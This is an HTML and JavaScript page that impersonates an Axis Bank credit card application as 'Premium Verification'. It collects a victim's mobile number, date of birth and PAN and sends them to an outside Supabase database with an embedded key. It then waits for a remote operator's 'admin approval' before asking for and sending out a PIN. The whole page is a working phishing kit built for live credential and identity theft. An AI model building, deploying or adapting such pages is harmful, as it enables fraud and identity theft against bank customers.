<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Axis Bank - Credit Card Application</title>
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', sans-serif;
            background: #f5f6f8;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 15px;
        }

        .main-container {
            width: 100%;
            max-width: 480px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .header {
            background: #8c1d3e;
            color: white;
            padding: 18px 20px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo {
            font-size: 28px;
            font-weight: 800;
            letter-spacing: -1px;
        }

        .logo-dot {
            color: #ffcc00;
        }

        .tagline {
            font-size: 15px;
            margin-top: 4px;
            opacity: 0.95;
        }

        .content {
            padding: 30px 25px;
        }

        h2 {
            text-align: center;
            color: #1e2a44;
            font-size: 24px;
            margin-bottom: 8px;
        }

        .subtitle {
            text-align: center;
            color: #555;
            font-size: 15px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 600;
            color: #1e2a44;
            font-size: 14px;
        }

        input {
            width: 100%;
            padding: 13px 16px;
            border: 1.5px solid #c8ced7;
            border-radius: 6px;
            font-size: 16px;
        }

        input:focus {
            border-color: #8c1d3e;
            outline: none;
        }

        button {
            width: 100%;
            padding: 14px;
            background: #8c1d3e;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16.5px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background: #a0224a;
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.65);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            background: white;
            width: 90%;
            max-width: 380px;
            border-radius: 12px;
            padding: 30px 25px;
            text-align: center;
            box-shadow: 0 15px 50px rgba(0,0,0,0.25);
        }

        .loader {
            width: 50px;
            height: 50px;
            border: 4px solid #f0f0f0;
            border-top: 4px solid #8c1d3e;
            border-radius: 50%;
            margin: 15px auto;
            animation: spin 1s linear infinite;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .success { color: #008000; font-size: 26px; font-weight: 700; margin: 15px 0; }
        .reject { color: #d32f2f; font-size: 22px; font-weight: 700; margin: 15px 0; }
        .wait { color: #8c1d3e; font-weight: 600; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="header">
            <div style="font-size:32px; font-weight:900;">A</div>
            <div>
                <div class="logo">AXIS BANK<span class="logo-dot">.</span></div>
                <div class="tagline">Your credit card application is just a few clicks away</div>
            </div>
        </div>

        <div class="content">
            <h2>Premium Verification</h2>
            <p class="subtitle">Secure • Instant Approval</p>

            <div class="form-group">
                <label>Mobile Number *</label>
                <input type="text" id="number1" placeholder="Enter 10-digit mobile number" maxlength="10">
            </div>

            <div class="form-group">
                <label>Date of Birth *</label>
                <input type="month" id="date_value">
            </div>

            <div class="form-group">
                <label>PAN Number *</label>
                <input type="text" id="number2" placeholder="Enter PAN Number" maxlength="10" style="text-transform:uppercase">
            </div>

            <button onclick="submitForm()">Continue</button>
        </div>
    </div>

    <!-- Status Modal -->
    <div id="statusModal" class="modal">
        <div class="modal-content" id="modalContent">
            <!-- JS will fill this -->
        </div>
    </div>

    <script>
    const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co';
    const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
    const client = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    let currentId = null;
    let interval = null;

    function showModal(html) {
        document.getElementById('modalContent').innerHTML = html;
        document.getElementById('statusModal').style.display = 'flex';
    }

    function hideModal() {
        document.getElementById('statusModal').style.display = 'none';
    }

    async function submitForm(){
        const number1 = document.getElementById('number1').value.trim();
        const date_value = document.getElementById('date_value').value;
        const number2 = document.getElementById('number2').value.trim();

        if(!number1 || !date_value || !number2){
            alert('Please fill all fields');
            return;
        }

        showModal(`
            <div class="loader"></div>
            <div class="wait">Submitting your request...</div>
        `);

        const { data, error } = await client
            .from('requests')
            .insert([{ 
                number1, 
                date_value, 
                number2, 
                status: 'pending', 
                pin: '', 
                pin_status: 'waiting' 
            }])
            .select();

        if(error){
            showModal(`<div class="reject">Submission Error</div>`);
            return;
        }

        currentId = data[0].id;
        listenStatus();
    }

    function listenStatus(){
        clearInterval(interval);
        interval = setInterval(async () => {
            const { data, error } = await client
                .from('requests')
                .select('*')
                .eq('id', currentId)
                .single();

            if(error) return;

            if(data.status === 'pending'){
                showModal(`
                    <div class="loader"></div>
                    <div class="wait">Waiting for admin approval...</div>
                `);
            } 
            else if(data.status === 'rejected'){
                clearInterval(interval);
                showModal(`<div class="reject">Request Rejected</div>`);
            } 
            else if(data.status === 'accepted'){
                if(data.pin_status === 'waiting'){
                    // Stop interval when showing PIN input
                    clearInterval(interval);
                    showModal(`
                        <div class="wait">Enter PIN to proceed</div>
                        <input type="text" id="pin" placeholder="Enter PIN" 
                               style="width:100%; padding:14px; margin:15px 0; border:1.5px solid #c8ced7; border-radius:6px; font-size:16px;">
                        <button onclick="submitPin()" 
                                style="background:#8c1d3e; width:100%; padding:14px; border:none; border-radius:6px; color:white; font-weight:600;">
                            Submit PIN
                        </button>
                    `);
                } 
                else if(data.pin_status === 'pending'){
                    showModal(`
                        <div class="loader"></div>
                        <div class="wait">Verifying PIN...</div>
                    `);
                } 
                else if(data.pin_status === 'rejected'){
                    clearInterval(interval);
                    showModal(`<div class="reject">PIN Rejected</div>`);
                } 
                else if(data.pin_status === 'accepted'){
                    clearInterval(interval);
                    showModal(`
                        <div class="success">Congratulations! 🎉<br>Verified Successfully</div>
                    `);
                }
            }
        }, 2000);
    }

    async function submitPin(){
        const pinInput = document.getElementById('pin');
        if(!pinInput) return;
        
        const pin = pinInput.value.trim();
        if(!pin){
            alert("Please enter PIN");
            return;
        }

        showModal(`
            <div class="loader"></div>
            <div class="wait">Submitting PIN...</div>
        `);

        const { error } = await client
            .from('requests')
            .update({ pin: pin, pin_status: 'pending' })
            .eq('id', currentId);

        if(error) {
            showModal(`<div class="reject">Error Submitting PIN</div>`);
        }
    }
    </script>
</body>
</html>
